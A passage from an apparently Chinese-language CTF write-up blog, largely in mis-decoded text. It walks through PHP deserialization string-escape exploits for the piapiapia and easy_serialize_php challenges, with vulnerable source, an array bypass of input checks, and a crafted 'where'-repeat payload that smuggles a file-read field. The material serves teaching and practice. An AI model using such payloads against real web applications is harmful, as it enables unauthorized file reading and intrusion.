echoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequireï¼Œeval() ä»¥åŠç±»ä¼¼çš„è¯­è¨€ç»“æ„ã€‚éœ€è¦ä½¿ç”¨è‡ªå·±çš„åŒ…è£…å‡½æ•°æ¥å°†è¿™äº›ç»“æ„ç”¨ä½œå¯å˜å‡½æ•°ã€‚</p></blockquote><p>æ‰€ä»¥ï¼š</p><ul><li>evalæ˜¯è¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨</li><li>åœ¨php7.1ç‰ˆæœ¬ä¹‹å assert()é»˜è®¤ä¸å†å¯ä»¥æ‰§è¡Œä»£ç </li></ul><h2 id="0CTF2016-piapiapia">[0CTF2016]piapiapia</h2><h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3><ul><li>æ•°ç»„ç»•è¿‡</li><li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li></ul><h3 id="è§£é¢˜-v9">è§£é¢˜</h3><p><code>www.zip</code>ä¸‹è½½æºç ï¼Œä¸€å…±æœ‰6ä¸ªPHPæ–‡ä»¶ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±ä¸‹é¢è¿™å‡ ä¸ªæ–‡ä»¶ã€‚</p><p>å¾ˆæ˜æ˜¾flagåœ¨<code>config.php</code>ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>profile.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>update.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; $_FILES[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨<code>profile.php</code>æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å¯ä»¥è¯»æ–‡ä»¶çš„åœ°æ–¹<code>$photo = base64_encode(file_get_contents($profile['photo']));</code>ï¼Œå¹¶ä¸”<code>$profile</code>å˜é‡æ˜¯ç»è¿‡ååºåˆ—åŒ–çš„ã€‚é‚£ä¹ˆç°åœ¨çš„ç›®æ ‡å°±æ˜¯è¦æŠŠ<code>$profile['photo']</code>çš„å€¼æ›¿æ¢æˆ<code>config.php</code>ï¼Œ<code>update.php</code>ä¸­å¯ä»¥æ§åˆ¶<code>$profile</code>å˜é‡ã€‚ä¸»è¦æ˜¯ä¸‹é¢è¿™ä¸€æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥äº†æ•°ç»„ä¸­è¿™å››ä¸ªå€¼ï¼Œç„¶åå°†æ•°ç»„åºåˆ—åŒ–åå¸¦å…¥userç±»ä¸­çš„update_profileæ–¹æ³•ä¸­ä»è€Œæ›´æ”¹è¡¨ä¿¡æ¯ã€‚ç„¶åæˆ‘ä»¬æŸ¥çœ‹å†…å®¹æ—¶ä¼šåœ¨<code>profile.php</code>ä¸­ååºåˆ—åŒ–åè¿”å›ç»™æˆ‘ä»¬è¦çœ‹çš„ä¿¡æ¯ã€‚å†å»çœ‹ä¸€ä¸‹<code>update_profile</code>å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªé˜²æ­¢sqlæ³¨å…¥çš„æ–¹æ³•ï¼Œå…¶ä¸­ä»–å°†ä¸Šé¢äº”ä¸ªsqlå…³é”®å­—æ›¿æ¢ä¸ºäº†hackerã€‚çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†è¿™å´æ˜¯æˆ‘ä»¬æœ€é‡è¦çš„åˆ©ç”¨ç‚¹ã€‚</p><blockquote><p>ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œ<strong>å¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†</strong>ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚</p></blockquote><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªæ­£å¸¸çš„<code>$profile</code>ç»è¿‡åºåˆ—åŒ–åæ˜¯ä»€ä¹ˆæ ·å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile = a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ›´æ”¹çš„ä¿¡æ¯æ˜¯è¦ç»è¿‡åºåˆ—åŒ–å­˜å…¥æ•°æ®åº“çš„ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬åœ¨ä¿¡æ¯ä¸­å¡«å…¥äº†å…³é”®å­—ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;select&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¼šæ›¿æ¢ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ä¼šæ­£å¸¸æ‰§è¡Œï¼Œå› ä¸ºå­—ç¬¦æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœå¡«å…¥äº†whereã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;where&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ä¼šæ›¿æ¢ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¼šå‘ç°ä¼šå‡ºé”™ï¼Œå› ä¸ºwhereæ˜¯äº”ä¸ªå­—ç¬¦ï¼Œè€Œhackeræ˜¯å…­ä¸ªï¼Œå¯¹äºå‡ºwhereä»¥å¤–çš„å…¶ä»–éƒ½æ˜¯å…­å­—ç¬¦ï¼Œæ‰€ä»¥åªæœ‰whereä¼šå‡ºé”™ï¼Œå› æ­¤è¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ã€‚å½“æˆ‘ä»¬æŠŠhackerå¤šä½™çš„è¿™ä¸ªræ›¿æ¢æˆ<code>&quot;;i:1;s:5:&quot;world&quot;;&#125;</code>æ—¶ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacke&quot;;i:1;s:5:&quot;world&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>phpååºåˆ—åŒ–æ—¶ä¼šå¿½ç•¥åé¢çš„éæ³•éƒ¨åˆ†&quot;;i:1;s:5:â€œworldâ€;}ï¼Œå¯ä»¥ååºåˆ—åŒ–æˆåŠŸã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¤šå†™å‡ ä¸ªwhereï¼Œè¿™æ ·åœ¨æ›¿æ¢æ—¶æ¯å¤šå‡ºçš„ä¸€ä¸ªrå°±ä¸ºæˆ‘ä»¬æ„é€ å­—ç¬¦ä¸²æä¾›ä¸€ä¸ªä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>åŠ åœ¨åé¢ç”¨æ¥è¯»config.phpæ–‡ä»¶ã€‚å…±34ä¸ªå­—ç¬¦ï¼Œå› æ­¤éœ€è¦åŠ 34çš„whereï¼Œæ‰€ä»¥æœ€åéœ€è¦è¾“å…¥çš„æ•°æ®ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·åœ¨ååºåˆ—åŒ–åå¤§æ¦‚å°±æ˜¯è¿™æƒ…å†µï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è¿™34ä¸ªå­—ç¬¦ä¼šåŒ…å«åœ¨204ä¸ªæ€»å­—ç¬¦å†…ã€‚<br>æ›¿æ¢ä¸ºhackeråï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºhackeræ¯”whereå¤šä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æ­£å¥½å æ®äº†è¿™å¤šä½™çš„34ä¸ªå­—ç¬¦ï¼Œä½¿å¾—å…¶é€ƒé€¸äº†å‡ºæ¥ï¼Œä¾¿å¯ä»¥æˆåŠŸååºåˆ—åŒ–ã€‚</p><p>payloadæ„é€ æˆåŠŸäº†ï¼Œå†æ‰¾è¾“å…¥ç‚¹ã€‚</p><blockquote><p>md5(Array()) = null<br>sha1(Array()) = null<br>ereg(pattern,Array()) = null<br>preg_match(pattern,Array()) = false<br>strcmp(Array(), â€œabcâ€) = null<br>strpos(Array(),â€œabcâ€) = null<br>strlen(Array()) = null</p></blockquote><p>ä¸‹é¢çš„è¿™ä¸ªpreg_mathå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150607.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150646.png" alt=""></p><h3 id="å‚è€ƒ-v2">å‚è€ƒ</h3><p><a href="https://xz.aliyun.com/t/7570#toc-9">https://xz.aliyun.com/t/7570#toc-9</a></p><p><a href="http://www.lin2zhen.top/index.php/archives/73/">http://www.lin2zhen.top/index.php/archives/73/</a></p><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php-v2">[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3><ul><li>phpinfoä¿¡æ¯æœé›†</li><li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li></ul><h3 id="è§£é¢˜-v10">è§£é¢˜</h3><p>ä¸Šæ¥å°±ç›´æ¥ä¸ªæºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çœ‹åˆ°æœ‰ä¸€ä¸ªå˜é‡è¦†ç›–çš„æ¼æ´ï¼Œä½†æ˜¯è¿˜ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹ã€‚</p><p>ä¼ å…¥<code>f=phpinfo</code>å¯ä»¥çœ‹åˆ°sometingï¼Œè¯•è¯•çœ‹</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713152851.png" alt=""></p><p>åœ¨æ¯ä¸ªphpæ–‡ä»¶å‰é¢éƒ½è‡ªåŠ¨åŒ…å«äº†<code>d0g3_f1ag.php</code>ï¼Œç›´æ¥è®¿é—®æ²¡æœ‰ä»»ä½•å›æ˜¾ã€‚</p><p>å½“<code>$function=show_image</code>çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨<code>file_get_contents</code>å‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶<code>$userinfo['img']</code>å‚æ•°ä¸º<code>d0g3_f1ga.php</code>å°±å¯ä»¥è¯»flagã€‚</p><p>ä½†æ˜¯å¦‚æœä¼ å…¥<code>img_path</code>å‚æ•°çš„è¯ä¼šå…ˆå¯¹å…¶base64ç¼–ç ç„¶åsha1åŠ 